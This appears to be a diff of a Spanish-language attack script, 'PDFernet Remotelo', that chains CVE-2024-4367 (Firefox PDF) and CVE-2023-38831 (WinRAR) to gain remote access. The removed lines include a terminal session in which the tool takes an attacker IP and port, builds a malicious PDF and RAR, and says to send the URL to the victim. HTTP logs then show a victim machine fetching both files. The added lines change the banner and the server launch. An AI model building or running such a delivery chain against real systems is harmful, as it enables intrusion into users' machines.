@@ -1,85 +1,15 @@
-
-  ___ ___  ___                 _   ___               _       _     
- | _ \   \| __|__ _ _ _ _  ___| |_| _ \___ _ __  ___| |_ ___| |___ 
- |  _/ |) | _/ -_) '_| ' \/ -_)  _|   / -_) '  \/ _ \  _/ -_) / _ \
- |_| |___/|_|\___|_| |_||_\___|\__|_|_\___|_|_|_\___/\__\___|_\___/
-                                                                   
-Script: PDFernet Remotelo
-----------------------------------
-PoC de Ejecución de Acceso remoto por medio de un PDF malicioso y Winrar.
-CVE Explotados: CVE-2024-4367 y CVE-2023-38831
-----------------------------------
-Créditos:
-Scripts utilizados: https://github.com/LOURC0D3/CVE-2024-4367-PoC y https://github.com/HDCE-inc/CVE-2023-38831
-----------------------------------
-Debe aclararse que para que funcione este script el sistema debe tener una versión de Winrar 6.22 y Firefox 126 o inferior.
-
-Ingrese la IP seguido de un espacio y el puerto del equipo atacante (ej. 192.168.0.220 6565): 192.168.0.220 6565
-CVE-2023-38831 POC
--------------------------------
-Exploit generated successfully as 'PDFernetRemotelo.rar'.
-[+] Created malicious PDF file: poc.pdf
-[+] Open the file with the vulnerable application to trigger the exploit.
-
-##########################################################
-#                                                        #
-#    URL para que el usuario acceda:                     #
-#    http://192.168.0.220/poc.pdf                                 #
-#    Enviar esta URL a la víctima.                       #
-#                                                        #
-##########################################################
-
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-192.168.0.226 - - [19/Jun/2024 19:08:17] "GET /poc.pdf HTTP/1.1" 200 -
-192.168.0.226 - - [19/Jun/2024 19:08:17] "GET /PDFernetRemotelo.rar HTTP/1.1" 200 -
-^C
-Keyboard interrupt received, exiting.
-                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/por/final]
-└─$ ls
-PDFernet.py  PDFernetRemotelo.py  PDFernetRemotelo.rar  poc.pdf  Remotelo.py  ResumendeSueldo.pdf  script.bat  tmp
-                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/por/final]
-└─$ rm PDFernet.py 
-                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/por/final]
-└─$ rm PDFernetRemotelo.rar 
-                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/por/final]
-└─$ rm poc.pdf 
-                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/por/final]
-└─$ rm Remotelo.py 
-                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/por/final]
-└─$ rm ResumendeSueldo.pdf 
-                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/por/final]
-└─$ rm script.bat 
-                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/por/final]
-└─$ rm -r tmp    
-                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/por/final]
-└─$ ls
-PDFernetRemotelo.py
-                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/por/final]
-└─$ cat PDFernetRemotelo.py 
 # Main script to create files and execute commands
 
 import os
 
 # Step 1: Display the banner and information
 banner = """
- _    _ _____ _____ _   _            _  ___            _____      _       _     
-| |  | |_   _|  _  | | | |          | |/ (_)          |  ___|    (_)     | |    
-| |  | | | | | | | | |_| | ___  __ _| ' / _ _ __   ___| |__ _ __  _ _ __ | |__  
-| |/\| | | | | | | |  _  |/ _ \/ _` |  < | | '_ \ / _ \  __| '_ \| | '_ \| '_ \ 
-\  /\  / | | \ \_/ / | | |  __/ (_| | . \| | | | |  __/ |__| | | | | |_) | | | |
- \/  \/  \_/  \___/\_| |_/\___|\__, |_|\_\_|_| |_|\___\____/_| |_|_| .__/|_| |_|
-                                 __/ |                               | |        
-                                |___/                                |_|        
+
+  ___ ___  ___                 _   ___               _       _     
+ | _ \   \| __|__ _ _ _ _  ___| |_| _ \___ _ __  ___| |_ ___| |___ 
+ |  _/ |) | _/ -_) '_| ' \/ -_)  _|   / -_) '  \/ _ \  _/ -_) / _ \
+ |_| |___/|_|\___|_| |_||_\___|\__|_|_\___|_|_|_\___/\__\___|_\___/
+                                                                   
 
 Script: PDFernet Remotelo
 ----------------------------------
@@ -89,7 +19,7 @@ CVE Explotados: CVE-2024-4367 y CVE-2023-38831
 Créditos:
 Scripts utilizados: https://github.com/LOURC0D3/CVE-2024-4367-PoC y https://github.com/HDCE-inc/CVE-2023-38831
 ----------------------------------
-Debe aclararse que para que funcione este script el sistema debe tener una versión de Winrar 6.22 y Firefox 126 o inferior.
+Para que funcione este script el sistema debe tener una versión de Winrar 6.22 y Firefox 126 o inferior.
 """
 
 print(banner)
@@ -371,5 +301,3 @@ print(url_message)
 
 
 os.system("python3 -m http.server 80")
-
-                                                       
